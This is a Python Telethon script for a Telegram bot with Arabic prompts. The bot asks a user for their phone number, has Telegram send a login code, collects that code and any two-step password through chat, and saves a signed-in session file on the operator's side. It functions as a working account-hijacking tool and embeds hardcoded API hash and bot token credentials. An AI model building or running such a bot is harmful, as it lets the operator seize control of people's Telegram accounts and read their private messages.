from telethon import Button
from telethon.sync import TelegramClient, events ,errors
import  asyncio
api_id = 2192036
api_hash = '3b86a67fc4e14bd9dcfc2f593e75c841'
bot_token = '5918274529:AAGw0OG3OgAa4-cdKL5FY98OzGm7s9tlJZ0'
bot = TelegramClient('hh', api_id, api_hash).start(bot_token=bot_token)
g=42
async def add_number_v1(event ,phone_number):
    global g
    cc = ("dex" + str(g))
    client = TelegramClient(cc, 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
    await client.connect()
    if not await client.is_user_authorized():
        await client.send_code_request(phone_number)
        async with bot.conversation(event.chat_id, timeout=300) as conv:
            await conv.send_message("__ارسل الكود الذي وصلك.. ضع علامة ( - ) بين كل رقم:__")
            response_verification_code = await conv.get_response()
            verification_code = str(response_verification_code.message).replace('-', '')
            try:
                await client.sign_in(phone_number, code=int(verification_code))
            except errors.SessionPasswordNeededError:
                await conv.send_message("__الحساب محمي بكلمة السر, ارسل كلمة السر :__")
                password = await conv.get_response()
                await client.sign_in(phone_number, password=password.text)
    client.disconnect()
    return "تم اضافة الرقم بنجاح ✅"
    g+=1
    print(g)


@bot.on(events.CallbackQuery(data="add_numberv1"))
async def Callbacks(event):
    await event.delete()
    # get information from user
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message('Phone number ?')
        phone_number_msg = await conv.get_response()
        phone_number_msg = phone_number_msg.text
        phone_number = phone_number_msg.replace('+', '').replace(' ', '')
        await conv.send_message(f'''ثواني''')
    result = await add_number_v1(event, phone_number)
    await asyncio.sleep(5)
    await event.reply(result)
async def StartButtons(event, role):
    if role == 1:
        buttons = [[Button.inline("➕", "add_numberv1")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)", buttons=buttons)

@bot.on(events.NewMessage(pattern='/start'))
async def BotOnStart(event):
    await StartButtons(event,1)
bot.run_until_disconnected()